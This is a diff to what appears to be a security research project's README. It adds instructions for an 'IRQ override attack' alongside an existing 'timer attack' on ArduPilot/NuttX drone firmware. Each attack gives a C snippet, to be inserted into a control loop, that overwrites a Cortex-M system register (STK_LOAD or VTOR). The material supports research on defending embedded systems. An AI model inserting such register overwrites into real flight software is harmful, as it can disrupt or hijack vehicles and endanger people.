@@ -54,7 +54,7 @@ mw 0xE000201C=0x0807efb9 1
 ### Prerequisite
 1) You need to know a value of the SysTick register (STK_LOAD). You can probably find such a register address on datasheet or source code of the RTOS (NuttX).
 
-### How to conduct the attack?
+### How to conduct the timer attack?
 1) Insert the code snippet in the below to a control loop (e.g., Copter::one_hz_loop() in ArduPilot)
 ```bash
 // 0xE000E014: STK_LOAD’s register address
@@ -67,4 +67,23 @@ volatile unsigned int *Timer_attack = (volatile unsigned int *) 0xE000E014;
 2) You can confirm the effect of the timer attack after booting.
 <img src="https://github.com/purseclab/M2MON/blob/main/attacks/timer_attack/result.png">
 
+## IRQ override attack
+### Prerequisite
+1) You need to know a value of the vector table offset register (VTOR). You can probably find such a register address on datasheet or source code of the RTOS (NuttX).
+
+### How to conduct the IRQ attack?
+1) Insert the code snippet in the below to a control loop (e.g., Copter::one_hz_loop() in ArduPilot)
+```bash
+// 0xE000ED08: VTOR’s register address
+volatile unsigned int *VTOR_attack = (volatile unsigned int *) 0xE000ED08;
+::printf("Original VTOR:0x%x\n", *VTOR_attack);
+
+// Overriding VTOR
+// 3758153728: 0xE000E000 in hex
+*VTOR_attack = 3758153728;
+::printf("Modified VTOR:0x%x\n", *VTOR_attack);
+```
+
+2) You can confirm the effect of the IRQ attack after booting.
+<img src="https://github.com/purseclab/M2MON/blob/main/attacks/IRQ_attack/result.png">
 
